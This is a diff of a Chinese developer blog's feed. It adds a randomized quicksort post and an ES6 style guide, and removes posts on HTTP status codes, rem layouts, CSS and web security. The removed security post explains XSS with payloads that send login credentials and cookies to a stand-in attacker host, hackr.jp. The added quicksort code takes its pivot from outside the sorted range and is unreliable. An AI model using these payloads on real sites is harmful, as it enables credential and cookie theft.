+在快速排序的时候我们是从左到右来选取比较对象,在随机快速排序中我们是随机来选取对象.
+流程如下:</p>
+<ol>
+<li>拿到一个数组
+<img src="http://upload-images.jianshu.io/upload_images/4337988-b7dd0bc29bf1f856.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数组"></li>
+<li>随机选择一个元素.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-068de5de14fbba31.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="随机选择到了44"></li>
+<li>并且把比他小的放在他的右边
+<img src="http://upload-images.jianshu.io/upload_images/4337988-903e43f47d9288a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="把比他小的先放在他的右边"></li>
+<li>然后把他和比他小的最右边的元素交换位置
+<img src="http://upload-images.jianshu.io/upload_images/4337988-9716186d31f495f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="交换位置"></li>
+<li>然后在随机选一个元素,重复步骤,知道所有元素都是在正确的位置上.
+<img src="http://upload-images.jianshu.io/upload_images/4337988-5eed2e2fa3aaf364.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="所有元素都在正确的位置上"></li>
+<li>代码实现</li>
+</ol>
+<pre><code class="language-js">function quickSort(array) {
+    function quick(array, left, right) {
+        let index;
+        if (array.length &gt; 1) {
+            index = partition(array, left, right);
+            if (left &lt; index - 1) {
+                quick(array, left, index - 1);
+            }
+            if (index &lt; right) {
+                quick(array, index, right);
+            }
+        }
+        return array;
+    }
+    function partition(array, left, right) {
+        const pivot = array[Math.floor(Math.random()*array.length)];
+        let i = left;
+        let j = right;
+    
+        while (i &lt;= j) {
+            while (array[i] &lt; pivot) {
+                i++;
+            }
+            while (array[j] &gt; pivot) {
+                j--;
+            }
+            if (i &lt;= j) {
+                [array[i], array[j]] = [array[j], array[i]]
+                i++;
+                j--;
+            }
+        }
+        return i;
+    }
+    quick(array, 0, array.length - 1);
+};
+</code></pre>
 ]]></content>
     </entry>
     <entry>
@@ -431,399 +1074,316 @@ $codeBgColor = #282c34 // 代码背景颜色
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[认识HTTP----状态码]]></title>
-        <id>https://hubingliang.github.io/post/status-code</id>
-        <link href="https://hubingliang.github.io/post/status-code">
+        <title type="html"><![CDATA[学会了ES6，就不会写出那样的代码]]></title>
+        <id>https://hubingliang.github.io/post/es6</id>
+        <link href="https://hubingliang.github.io/post/es6">
         </link>
-        <updated>2017-10-28T05:57:41.000Z</updated>
-        <content type="html"><![CDATA[<p><strong>本文内容大多参考<a href="https://book.douban.com/subject/25863515/">《图解HTTP》一书</a></strong></p>
-<h2 id="什么是状态码">什么是状态码？</h2>
-<p>当我们向服务端发送请求的时候，为了让用户更好的理解返回结果，通常要借助状态码来通知用户服务器端是正常处理了请求，还是出现了偏差。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-58f1c4215d05ea95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="响应的状态码可描述请求的处理结果"></p>
-<p><strong>状态码如200 OK，以3 位数字和原因短语组成。</strong>
-<strong>数字中的第一位指定了响应类别，后两位无分类。响应类别有以下5 种。</strong></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-bf822bc144edc3e8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<p>状态码数量繁多，实际经常使用只有14多种，下面只介绍一下具有代表性的14 个状态码。</p>
-<h2 id="2xx-成功">2XX 成功</h2>
-<p>2XX 的响应结果表明请求被正常处理了。</p>
-<h3 id="200-ok">200 OK</h3>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-61676b0654a08ac5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<p>表示从客户端发来的请求在服务器端被正常处理了。</p>
-<h3 id="204-no-content">204 No Content</h3>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-f9d6fbcced90d307.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
-该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，也不允许返回任何实体的主体。比如，当从浏览器发出请求处理后，返回204 响应，那么浏览器显示的页面不发生更新。
-一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用。</p>
-<h3 id="206-partial-content">206 Partial Content</h3>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-3026ffedffa36572.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<p>该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET 请求。响应报文中包含由Content-Range 指定范围的实体内容。</p>
-<h2 id="3xx重定向">3XX重定向</h2>
-<p>3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。</p>
-<h3 id="301-moved-permanently">301 Moved Permanently</h3>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-b1345d016e324c54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<p>永久性重定向。该状态码表示请求的资源已被分配了新的URI，以后应使用资源现在所指的URI。</p>
-<h3 id="302-found">302 Found</h3>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-da317dbc465ef206.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<p>临时性重定向。该状态码表示请求的资源已被分配了新的URI，希望用户（本次）能使用新的URI 访问。
-和301 Moved Permanently 状态码相似，但302 状态码代表的资源不是被永久移动，只是临时性质的。换句话说，已移动的资源对应的URI 将来还有可能发生改变。</p>
-<h3 id="303-see-other">303 See Other</h3>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-42dfb7ef295639d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<p>该状态码表示由于请求对应的资源存在着另一个URI，应使用GET方法定向获取请求的资源。
-303 状态码和302 Found 状态码有着相同的功能，但303 状态码明确表示客户端应当采用GET 方法获取资源，这点与302 状态码有区别。
-比如，当使用POST 方法访问CGI 程序，其执行后的处理结果是希望客户端能以GET 方法重定向到另一个URI 上去时，返回303 状态码。虽然302 Found 状态码也可以实现相同的功能，但这里使用303 状态码是最理想的。</p>
-<h3 id="304-not-modified">304 Not Modified</h3>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-e014430e6b091447.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
-该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。304 虽然被划分在3XX 类别中，但是和重定向没有关系。</p>
-<h3 id="307-temporary-redirect">307 Temporary Redirect</h3>
-<p>临时重定向。该状态码与302 Found 有着相同的含义。尽管302 标准禁止POST 变换成GET，但实际使用时大家并不遵守。
-307 会遵照浏览器标准，不会从POST 变成GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况。</p>
-<h2 id="4xx-客户端错误">4XX 客户端错误</h2>
-<p>4XX 的响应结果表明客户端是发生错误的原因所在。</p>
-<h3 id="400-bad-request">400 Bad Request</h3>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-a76b87f7b3357e68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
-该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像200 OK 一样对待该状态码。</p>
-<h3 id="401-unauthorized">401 Unauthorized</h3>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-fcd2dcebfb074152.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
-该状态码表示发送的请求需要有通过HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息。另外若之前已进行过1 次请求，则表示用户认证失败。
-返回含有401 的响应必须包含一个适用于被请求资源的WWWAuthenticate首部用以质询（challenge）用户信息。当浏览器初次接收到401 响应，会弹出认证用的对话窗口。</p>
-<h3 id="403-forbidden">403 Forbidden</h3>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-604eb2183c50e7d7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
-该状态码表明对请求资源的访问被服务器拒绝了。服务器端没有必要给出拒绝的详细理由，但如果想作说明的话，可以在实体的主体部分对原因进行描述，这样就能让用户看到了。
-未获得文件系统的访问授权，访问权限出现某些问题（从未授权的发送源IP 地址试图访问）等列举的情况都可能是发生403 的原因。</p>
-<h3 id="404-not-found">404 Not Found</h3>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-1802cc9939aae6c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<p>该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。</p>
-<h2 id="5xx服务器错误">5XX服务器错误</h2>
-<p>5XX 的响应结果表明服务器本身发生错误。</p>
-<h3 id="500-internal-server-error">500 Internal Server Error</h3>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-beb418dab1c3dbba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<p>该状态码表明服务器端在执行请求时发生了错误。也有可能是Web应用存在的bug 或某些临时的故障。</p>
-<h3 id="503-service-unavailable">503 Service Unavailable</h3>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-46134e7be9df6947.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
-该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的时间，最好写入Retry-After 首部字段再返回给客户端。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[rem方案完美解决自适应]]></title>
-        <id>https://hubingliang.github.io/post/rem</id>
-        <link href="https://hubingliang.github.io/post/rem">
-        </link>
-        <updated>2017-10-07T08:31:46.000Z</updated>
-        <content type="html"><![CDATA[<p>随着移动互联网的兴起，Web app的开发也越来越重要，与此同时页面布局也成了一个令人头痛的问题。rem的出现貌似可以完美解决移动端适配的问题。</p>
-<h2 id="什么是rem">什么是rem</h2>
-<p>说到rem自然就会想到em，我们知道em是相对于父元素的字体大小的单位，那么rem则是相对于根元素也就是<code>&lt;html&gt;</code>元素的字体大小的单位。</p>
-<h2 id="如何用rem解决移动端适配">如何用rem解决移动端适配</h2>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-bc2b886890d0962a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<p>通过这张图我们就可以观察到，div的宽度和高度是根据根元素<code>&lt;html&gt;</code>来决定的，根元素的字体大小为100px，然后给div的宽度和高度设置为2rem、1rem，最后生成的div的宽度为200px、高度为100px。
-也就是说我们可以通过改变根元素的字体大小，进而对页面进行等比例缩放,从而实现自适应。
-那么如何根据设备的不同来改变根元素的字体大小呢？
-我们在<code>&lt;head&gt;</code>标签里面引入这样一段js代码：</p>
-<pre><code class="language-js">var width = document.documentElement.clientWidth
-var css = `
-    html{
-    font-size: ${width/10}px;
-    }
-    `
-document.write(`&lt;style&gt;${css}&lt;/style&gt;`)
+        <updated>2018-04-09T09:41:02.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="声明变量的新姿势">声明变量的新姿势</h2>
+<h3 id="用let不用var">用let不用var</h3>
+<p>ES6之前我们用var声明一个变量，但是它有很多弊病：</p>
+<ul>
+<li>因为没有块级作用域，很容易声明全局变量</li>
+<li>变量提升</li>
+<li>可以重复声明 还记得这道面试题吗？</li>
+</ul>
+<pre><code class="language-js">var a = [];
+for (var i = 0; i &lt; 10; i++) {
+  a[i] = function () {
+    console.log(i);
+  };
+}
+a[6](); // 10
+a[7](); // 10
+a[8](); // 10
+a[9](); // 10
 </code></pre>
-<p>很简单，只做了一件事：就是把根元素的字体大小改成当前设备的宽度，然后我们在开发的时候全部根据设计稿的宽度来设置每一个元素的大小。
-如果设计稿的宽度是按照iphone5的宽度来设计的，那么开发的时候也要根据iphone的宽度也就是320px来设置。</p>
-<blockquote>
-<p>不过最后不要忘了在body元素中重新设置正常的font-size，不然整个页面会垮掉！！</p>
-</blockquote>
-<p>例子：如果这是我们要做的设计稿</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-591bb00dccbcc0f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<p>一个歌单的封面大小为103px，那么我们在写css的时候就要写（103/320）px，这时候你肯定会觉得很麻烦，难道我每次都要这样计算吗？
-不用，每次只要写出实际的px大小就好，px和rem的转换可以借助网站工具：
-<a href="http://520ued.com/tools/rem">px =&gt; rem</a>
-<a href="http://alurk.com/">功能更加强大的rem转换</a></p>
-<h2 id="参考文献">参考文献</h2>
+<p>所以，你现在还有什么理由不用let?</p>
+<h3 id="有时候const比let更好">有时候const比let更好</h3>
+<p>const和let的唯一区别就是，const不可以被更改，所以当声明变量的时候，尤其是在声明容易被更改的全局变量的时候，尽量使用const。</p>
 <ul>
-<li><a href="http://caibaojian.com/web-app-rem.html">rem是如何实现自适应布局的？</a></li>
-<li><a href="http://caibaojian.com/rem-responsive-2.html">rem自适应布局的回顾总结</a></li>
+<li>更好的代码语义化，一眼看到就是常量。</li>
+<li>另一个原因是因为JavaScript 编译器对const的优化要比let好，多使用const，有利于提高程序的运行效率。</li>
+<li>所有的函数都应该设置为常量。</li>
 </ul>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[2周时间掌握47个CSS技巧]]></title>
-        <id>https://hubingliang.github.io/post/47css-trick</id>
-        <link href="https://hubingliang.github.io/post/47css-trick">
-        </link>
-        <updated>2017-09-23T09:08:53.000Z</updated>
-        <content type="html"><![CDATA[<p><img src="http://upload-images.jianshu.io/upload_images/4337988-5c96398f52336f77.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<p>两周前入手了<a href="https://book.douban.com/subject/26745943/">《CSS揭秘》</a></p>
-<p>两周时间收益匪浅，学习了很多CSS技巧，感觉打开了新世界的大门，在看到一半的时候感觉还是自己实现一边印象比较深刻。于是自己把47个CSS技巧全部实现了一遍：<a href="https://github.com/hubingliang/CSS-secrets">Github</a> 具体实现方法可以在控制台查看CSS，欢迎 star。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-e5572657637e9e85.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
-其中有多个解决方法的情况，使用了当下最优解来实现，之后发现了几个问题：有几个CSS技巧并没有成功--24、25、26</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-0f3b302a547a08f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
-在书中给的参考网站也同样失效了.....如果有大佬知道如何实现欢迎提pull request</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[认识HTTP----Web安全与攻击手段]]></title>
-        <id>https://hubingliang.github.io/post/securi</id>
-        <link href="https://hubingliang.github.io/post/securi">
-        </link>
-        <updated>2017-09-09T03:38:05.000Z</updated>
-        <content type="html"><![CDATA[<p><strong>本文内容大多参考<a href="https://book.douban.com/subject/25863515/">《图解HTTP》一书</a></strong></p>
-<h2 id="关于web的攻击手段">关于Web的攻击手段</h2>
-<p>目前，互联网攻击大多是针对应用HTTP协议的服务器和客户端，以及运行在服务器上的Web应用等资源，本文主要针对Web应用的攻击技术进行简单分析。</p>
-<h3 id="针对web应用的攻击模式">针对Web应用的攻击模式</h3>
-<p>对Web应用的攻击模式有以下两种。</p>
-<ul>
-<li>主动攻击
-主动攻击（active attack）是指攻击者通过直接访问Web 应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源。</li>
-</ul>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-3b2645de43c3de0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="这个攻击者没法吐槽"></p>
-<ul>
-<li>被动攻击
-被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标Web 应用访问发起攻击。
-被动攻击通常的攻击模式如下所示。</li>
-</ul>
-<ol>
-<li>攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的HTTP 请求。</li>
-<li>当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱。</li>
-<li>中招后的用户浏览器会把含有攻击代码的HTTP 请求发送给作为攻击目标的Web 应用，运行攻击代码。</li>
-<li>执行完攻击代码，存在安全漏洞的Web 应用会成为攻击者的跳板，可能导致用户所持的Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果。被动攻击模式中具有代表性的攻击是跨站脚本攻击（xss）和跨站点请求伪造（CSRF/XSRF）。</li>
-</ol>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-72423c77abb5909d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<h3 id="因输出值转义不完全引发的安全漏洞">因输出值转义不完全引发的安全漏洞</h3>
-<p>实施Web 应用的安全对策可大致分为以下两部分。</p>
-<ul>
-<li>客户端验证</li>
-<li>Web应用端（服务器）验证
-<ul>
-<li>输入值验证</li>
-<li>输出值转义</li>
-</ul>
-</li>
-</ul>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-511ebfb85ffa5947.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<p>多数情况下采用JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭JavaScript，不适合将JavaScript 验证作为安全的防范对策。保留客户端验证只是为了尽早地辨识输入错误，起到提高UI 体验的作用。
-Web 应用端的输入值验证按Web 应用内的处理则有可能被误认为是具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策。
-从数据库或文件系统、HTML、邮件等输出Web 应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。</p>
-<h2 id="跨站脚本攻击xss">跨站脚本攻击（XSS）</h2>
-<p>跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或者Javascript的一种攻击。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。
-跨站脚本攻击有可能造成以下影响：</p>
-<ul>
-<li>利用虚假输入表单骗取用户个人信息。</li>
-<li>利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。</li>
-<li>显示伪造的文章或图片（莫名其妙的广告）。</li>
-</ul>
-<h3 id="简单例子">简单例子</h3>
-<p><strong>在动态生成HTML处发生：</strong></p>
-<p>下面以编辑个人信息页面为例讲解跨站脚本攻击。下方界面显示了用户输入的个人信息内容。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-f42a8f9323739e75.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="跨站脚本攻击案例"></p>
-<p>确认界面按原样显示在编辑界面输入的字符串。此处输入带有山口
-一郎这样的HTML 标签的字符串。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-ec25584204f71ee4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="按照输入内容原样显示的机制"></p>
-<p>此时的确认界面上，浏览器会把用户输入的<code>&lt;s&gt;</code> 解析成HTML 标签，然后显示删除线。
-删除线显示出来并不会造成太大的不利后果，但如果换成使用script 标签将会如何呢。</p>
-<h2 id="xss-是攻击者利用预先设置的陷阱触发的被动攻击">XSS 是攻击者利用预先设置的陷阱触发的被动攻击</h2>
-<p>跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于攻击的陷阱。
-下图网站通过地址栏中URI 的查询字段指定ID，即相当于在表单内自动填写字符串的功能。而就在这个地方，隐藏着可执行跨站脚本攻击的漏洞。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-23e6fa19d23f219e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
-充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶意代码的URL。并隐藏植入事先准备好的欺诈邮件中或Web 页面内，诱使用户去点击该URL。</p>
-<pre><code>http://example.jp/login?ID=&quot;&gt;&lt;script&gt;var+f=document⇒
-.getElementById(&quot;login&quot;);+f.action=&quot;http://hackr.jp/pwget&quot;;+f.method=⇒
-&quot;get&quot;;&lt;/script&gt;&lt;span+s=&quot;
+<h2 id="动态字符串">动态字符串</h2>
+<p>不要使用“双引号”，一律用单引号或反引号</p>
+<pre><code class="language-js">// low
+const a = &quot;foobar&quot;;
+const b = 'foo' + a + 'bar';
+
+// best
+const a = 'foobar';
+const b = `foo${a}bar`;
+const c = 'foobar';
 </code></pre>
-<p>浏览器打开该URI 后，直观感觉没有发生任何变化，但设置好的脚本却偷偷开始运行了。当用户在表单内输入ID 和密码之后，就会直接发送到攻击者的网站（也就是hackr.jp），导致个人登录信息被窃取。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-d9c24bd7a2426f2b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<p>之后，ID 及密码会传给该正规网站，而接下来仍然是按正常登录步骤，用户很难意识到自己的登录信息已遭泄露。</p>
-<p><strong>对 http://example.jp/login?ID=yama 请求时对应的HTML源代码（摘录）</strong></p>
-<pre><code class="language-html">&lt;div class=&quot;logo&quot;&gt;
-![](/img/logo.gif)
-&lt;/div&gt;
-&lt;form action=&quot;http://example.jp/login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;
-&lt;div class=&quot;input_id&quot;&gt;
-ID &lt;input type=&quot;text&quot; name=&quot;ID&quot; value=&quot;yama&quot; /&gt;
-&lt;/div&gt;
+<h2 id="解构赋值的骚操作">解构赋值的骚操作</h2>
+<h3 id="变量赋值">变量赋值</h3>
+<p>在用到数组成员对变量赋值时，尽量使用解构赋值。</p>
+<pre><code class="language-js">const arr = [1, 2, 3, 4];
+
+// low
+const first = arr[0];
+const second = arr[1];
+
+// good
+const [first, second] = arr;
 </code></pre>
-<pre><code class="language-html">**http://example.jp/login?ID=&quot;&gt;&lt;script&gt;var+f=document.getElementById
-(&quot;login&quot;);+f.action=&quot;http://hackr.jp/pwget&quot;;+f.method=&quot;get&quot;;&lt;/script&gt;
-&lt;span+s=&quot;对请求时对应的HTML源代码（摘录）**
+<h3 id="函数传对象">函数传对象</h3>
+<p>函数的参数如果是对象的成员，优先使用解构赋值。</p>
+<pre><code class="language-js">// low
+function getFullName(user) {
+  const firstName = user.firstName;
+  const lastName = user.lastName;
+}
+
+// good
+function getFullName({ firstName, lastName }) {
+}
 </code></pre>
-<pre><code class="language-html">&lt;div class=&quot;logo&quot;&gt;
-![](/img/logo.gif)
-&lt;/div&gt;
-&lt;form action=&quot;http://example.jp/login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;
-&lt;div class=&quot;input_id&quot;&gt;
-ID &lt;input type=&quot;text&quot; name=&quot;ID&quot; value=&quot;&quot;&gt;&lt;script&gt;var f=document⇒
-.getElementById(&quot;login&quot;); f.action=&quot;http://hackr.jp/pwget&quot;; f.method=⇒
-&quot;get&quot;;&lt;/script&gt;&lt;span s=&quot;&quot; /&gt;
-&lt;/div&gt;
+<p>如果函数返回多个值，优先使用对象的解构赋值，而不是数组的解构赋值。这样便于以后添加返回值，以及更改返回值的顺序。</p>
+<pre><code class="language-js">// low
+function processInput(input) {
+  return [left, right, top, bottom];
+}
+
+// good
+function processInput(input) {
+  return { left, right, top, bottom };
+}
+
+const { left, right } = processInput(input);
 </code></pre>
-<h3 id="对用户cookie的窃取攻击">对用户Cookie的窃取攻击</h3>
-<p>除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的Cookie 信息。
-<code>&lt;script src=http://hackr.jp/xss.js&gt;&lt;/script&gt;</code>
-该脚本内指定的http://hackr.jp/xss.js 文件。即下面这段采用JavaScript 编写的代码。</p>
-<pre><code class="language-js">var content = escape(document.cookie);
-document.write(&quot;&lt;img src=http://hackr.jp/?&quot;);
-document.write(content);
-document.write(&quot;&gt;&quot;);
+<h2 id="关于对象的细节">关于对象的细节</h2>
+<h3 id="逗号">逗号</h3>
+<p>单行定义的对象结尾不要逗号：</p>
+<pre><code class="language-js">// low
+const a = { k1: v1, k2: v2, };
+
+// good
+const a = { k1: v1, k2: v2 };
+
 </code></pre>
-<p>在存在可跨站脚本攻击安全漏洞的Web 应用上执行上面这段JavaScript 程序，即可访问到该Web 应用所处域名下的Cookie 信息。然后这些信息会发送至攻击者的Web 网站（http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的Cookie 信息了。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/4337988-73e389217a5eca2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="使用XSS 攻击夺取Cookie 信息"></p>
-<h2 id="跨站点请求伪造csrf">跨站点请求伪造(CSRF)</h2>
-<p>跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。
-跨站点请求伪造有可能会造成以下等影响。</p>
+<p>多行定义的对象要保留逗号：</p>
+<pre><code class="language-js">// low
+const b = {
+  k1: v1,
+  k2: v2
+};
+
+// good
+const b = {
+  k1: v1,
+  k2: v2,
+};
+</code></pre>
+<h3 id="一次性初始化完全">一次性初始化完全</h3>
+<p>不要声明之后又给对象添加新属性：</p>
+<pre><code class="language-js">// low
+const a = {};
+a.x = 3;
+
+// good
+const a = { x: null };
+a.x = 3;
+</code></pre>
+<p>如果一定非要加请使用<code>Object.assign</code>：</p>
+<pre><code class="language-js">const a = {};
+Object.assign(a, { x: 3 });
+</code></pre>
+<p>如果对象的属性名是动态的，可以在创造对象的时候，使用属性表达式定义：</p>
+<pre><code class="language-js">// low
+const obj = {
+  id: 5,
+  name: 'San Francisco',
+};
+obj[getKey('enabled')] = true;
+
+// good
+const obj = {
+  id: 5,
+  name: 'San Francisco',
+  [getKey('enabled')]: true,
+};
+</code></pre>
+<h3 id="在简洁一点">在简洁一点</h3>
+<p>在定义对象时，能简洁表达尽量简洁表达：</p>
+<pre><code class="language-js">var ref = 'some value';
+
+// low
+const atom = {
+  ref: ref,
+
+  value: 1,
+
+  addValue: function (value) {
+    return atom.value + value;
+  },
+};
+
+// good
+const atom = {
+  ref,
+
+  value: 1,
+
+  addValue(value) {
+    return atom.value + value;
+  },
+};
+</code></pre>
+<h2 id="数组">数组</h2>
+<h3 id="">...</h3>
+<p>使用扩展运算符<code>...</code>拷贝数组：</p>
+<pre><code class="language-js">// 还在用for i 你就太low了
+const len = items.length;
+const itemsCopy = [];
+let i;
+
+for (i = 0; i &lt; len; i++) {
+  itemsCopy[i] = items[i];
+}
+
+// cool !
+const itemsCopy = [...items];
+</code></pre>
+<h3 id="不要跟我提类数组">不要跟我提类数组</h3>
+<p>用<code>Array.from</code>方法，将类似数组的对象转为数组：</p>
+<pre><code class="language-js">const foo = document.querySelectorAll('.foo');
+const nodes = Array.from(foo);
+</code></pre>
+<h2 id="函数">函数</h2>
+<h3 id="箭头函数">箭头函数<code>=&gt;</code></h3>
+<p>立即执行函数可以写成箭头函数的形式：</p>
+<pre><code class="language-js">(() =&gt; {
+  console.log('Welcome to the Internet.');
+})();
+</code></pre>
+<p>尽量写箭头函数使你的代码看起来简洁优雅：</p>
+<pre><code class="language-js">// low
+[1, 2, 3].map(function (x) {
+  return x * x;
+});
+
+// cool !
+[1, 2, 3].map(x =&gt; x * x);
+</code></pre>
+<h3 id="不要把布尔值直接传入函数">不要把布尔值直接传入函数</h3>
+<pre><code class="language-js">// low
+function divide(a, b, option = false ) {
+}
+
+// good
+function divide(a, b, { option = false } = {}) {
+}
+</code></pre>
+<h3 id="别再用arguments类数组了">别再用arguments（类数组）了！</h3>
+<p>使用 rest 运算符（...）代替，rest 运算符可以提供一个真正的数组。</p>
+<pre><code class="language-js">// low
+function concatenateAll() {
+  const args = Array.prototype.slice.call(arguments);
+  return args.join('');
+}
+
+// good
+function concatenateAll(...args) {
+  return args.join('');
+}
+</code></pre>
+<h3 id="传参时试试设置默认值">传参时试试设置默认值？</h3>
+<pre><code class="language-js">// low
+function handleThings(opts) {
+  opts = opts || {};
+}
+
+// good
+function handleThings(opts = {}) {
+  // ...
+}
+</code></pre>
+<h2 id="objectmap">Object？Map！</h2>
+<h3 id="简单的键值对优先map">简单的键值对优先Map</h3>
+<p>如果只是简单的key: value结构，建议优先使用Map，因为Map提供方便的遍历机制。</p>
+<pre><code class="language-js">let map = new Map(arr);
+// 遍历key值
+for (let key of map.keys()) {
+  console.log(key);
+}
+// 遍历value值
+for (let value of map.values()) {
+  console.log(value);
+}
+// 遍历key和value值
+for (let item of map.entries()) {
+  console.log(item[0], item[1]);
+}
+</code></pre>
+<h2 id="更加简洁直观class语法">更加简洁直观class语法</h2>
+<pre><code class="language-js">// low
+function Queue(contents = []) {
+  this._queue = [...contents];
+}
+Queue.prototype.pop = function() {
+  const value = this._queue[0];
+  this._queue.splice(0, 1);
+  return value;
+}
+
+// good
+class Queue {
+  constructor(contents = []) {
+    this._queue = [...contents];
+  }
+  pop() {
+    const value = this._queue[0];
+    this._queue.splice(0, 1);
+    return value;
+  }
+}
+</code></pre>
+<h2 id="模块化">模块化</h2>
+<h3 id="引入模块">引入模块</h3>
+<p>使用<code>import</code>取代<code>require</code>，因为Module是Javascript模块的标准写法。</p>
+<pre><code class="language-js">// bad
+const moduleA = require('moduleA');
+const func1 = moduleA.func1;
+const func2 = moduleA.func2;
+
+// good
+import { func1, func2 } from 'moduleA';
+</code></pre>
